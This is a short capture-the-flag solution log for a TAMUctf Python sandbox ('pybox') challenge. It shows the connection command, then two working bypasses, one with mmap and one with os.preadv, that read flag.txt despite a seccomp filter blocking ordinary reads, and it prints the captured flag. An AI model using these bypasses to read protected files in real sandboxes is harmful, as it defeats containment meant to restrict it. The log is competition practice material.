@@ -1,0 +1,42 @@
+openssl s_client -connect tamuctf.com:443 -servername pybox -quiet
+
+========================== Solution 1: mmap ==========================
+
+depth=0 CN = hulkcybr1
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 CN = hulkcybr1
+verify return:1
+How many modules do you need to load?
+1
+Please enter required modules, one to a line
+mmap
+Please enter code, terminated by an empty line with a period (.)
+a = open('flag.txt','rb')
+x = mmap.mmap(a.fileno(), 26, flags=mmap.MAP_PRIVATE)
+print(x[:26])
+.
+b'gigem{m3m0ry_m4pp3d_f1l35}'
+
+
+Use mmap to read because they use seccomp to disable reading from a file.
+26 is by trial and error. 
+
+========================== Solution 2: os.preadv ==========================
+depth=0 CN = hulkcybr1
+verify error:num=18:self signed certificate
+verify return:1
+depth=0 CN = hulkcybr1
+verify return:1
+How many modules do you need to load?
+1
+Please enter required modules, one to a line
+os
+Please enter code, terminated by an empty line with a period (.)
+fd = os.open("flag.txt", os.O_RDONLY)
+test = [bytearray(50), bytearray()]
+print(os.preadv(fd, test, 0))
+print(test[0].decode())
+.
+26
+gigem{m3m0ry_m4pp3d_f1l35}
